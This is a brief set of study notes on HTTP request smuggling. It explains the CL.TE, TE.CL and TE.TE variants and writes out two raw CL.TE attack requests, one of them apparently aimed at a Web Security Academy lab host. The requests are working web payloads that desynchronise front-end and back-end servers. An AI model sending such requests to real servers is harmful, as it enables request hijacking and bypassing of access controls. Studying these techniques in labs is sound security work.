# HTTP Request smuggling Test

### headers

```
Content-Length
Transfer-Encoding
```

* CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
* TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
* TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

### HTTP request CL.TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```
POST / HTTP/1.1
Host: 0a2300b804b853f580aa493c0046000d.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0


GET /404 HTTP/1.1
X-Ignore: x
```
